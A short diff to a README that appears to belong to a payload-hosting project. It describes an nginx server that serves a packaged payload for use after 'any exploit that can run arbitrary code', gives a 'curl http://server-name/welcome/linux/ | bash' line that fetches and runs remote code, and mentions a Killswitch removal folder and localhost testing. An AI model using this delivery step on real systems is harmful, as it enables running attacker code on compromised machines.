@@ -17,10 +17,13 @@ nginx which serves static files very efficiently. It contains the packged
 payload and a script that can easily be called from a command line. This
 makes it easy to use it with any exploit that can run arbitrary code. An example
 would be:
-'''
+
+```
 curl http://server-name/welcome/linux/ | bash
-'''
+```
 
 Misc.
 ---
-The *Killswitch* contains scripts for easy removal.
+The *Killswitch* folder contains scripts for easy removal.
+
+<b>*This is currently a repo for testing, so several files will be configured to run or communicate on localhost*</b>
